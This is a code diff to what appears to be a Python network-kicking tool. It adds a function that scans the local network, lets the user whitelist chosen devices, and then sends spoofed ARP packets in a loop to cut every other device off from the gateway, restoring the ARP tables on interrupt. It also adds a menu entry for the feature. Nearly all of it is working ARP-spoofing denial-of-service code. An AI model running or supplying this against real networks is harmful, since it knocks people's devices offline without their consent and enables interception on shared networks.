@@ -544,6 +544,102 @@ def kicksomeoff():
         print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))
 
 
+# kick whitelisting devices
+def kickwhitelistoff():
+    os.system("clear||cls")
+
+    print("\n{}kickWHITELISTOff{} selected...{}\n".format(RED, GREEN, END))
+    global stopAnimation
+    stopAnimation = False
+    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
+    t.daemon = True
+    t.start()
+
+    # commence scanning process
+    try:
+        scanNetwork()
+    except KeyboardInterrupt:
+        shutdown()
+    stopAnimation = True
+
+    print("Online IPs: ")
+    for i in range(len(onlineIPs)):
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+        try:
+            hostname = utils.socket.gethostbyaddr(onlineIPs[i])[0]
+        except:
+            hostname = "N/A"
+        vendor = resolveMac(mac)
+        print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))
+
+    canBreak = False
+    while not canBreak:
+        try:
+            choice = input("\nChoose devices to whitelist (comma-separated): ")
+            if ',' in choice:
+                someTargets = choice.split(",")
+                canBreak = True
+            else:
+                print("\n{}ERROR: Please select more than 1 devices from the list.{}\n".format(RED, END))
+        except KeyboardInterrupt:
+            shutdown()
+
+    print(someTargets)
+    someTargets = [x for x in range(0, len(onlineIPs)) if x not in list(map(int, someTargets))]
+    print(someTargets)
+    someIPList = ""
+    for i in someTargets:
+        try:
+            someIPList += onlineIPs[int(i)] + ", "
+        except KeyboardInterrupt:
+            shutdown()
+        except:
+            print("\n{}ERROR: '{}{}{}' is not in the list.{}\n".format(RED, GREEN, i, RED, END))
+            return
+    someIPList = someIPList[:-2] + END
+
+    print("\n{}Targets: {}{}".format(GREEN, END, someIPList))
+
+    if options.packets is not None:
+        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
+    else:
+        print("\n{}Spoofing started... {}".format(GREEN, END))
+    try:
+        while True:
+            # broadcast malicious ARP packets
+            for i in someTargets:
+                ip = onlineIPs[int(i)]
+                for host in hostsList:
+                    if host[0] == ip:
+                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
+            if options.packets is not None:
+                time.sleep(60/float(options.packets))
+            else:
+                time.sleep(10)
+    except KeyboardInterrupt:
+        # re-arp targets on KeyboardInterrupt exception
+        print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
+        reArp = 1
+        while reArp != 10:
+            # broadcast ARP packets with legitimate info to restore connection
+            for i in someTargets:
+                ip = onlineIPs[int(i)]
+                for host in hostsList:
+                    if host[0] == ip:
+                        try:
+                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+                        except KeyboardInterrupt:
+                            pass
+                        except:
+                            runDebug()
+            reArp += 1
+            time.sleep(0.2)
+        print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))
+
+
 
 # kick all devices
 def kickalloff():
@@ -669,6 +765,9 @@ def main():
 
                 elif choice == '3':
                     kickalloff()
+
+                elif choice == '4':
+                    kickwhitelistoff()
 
                 elif choice.upper() == 'CLEAR':
                     os.system("clear||cls")
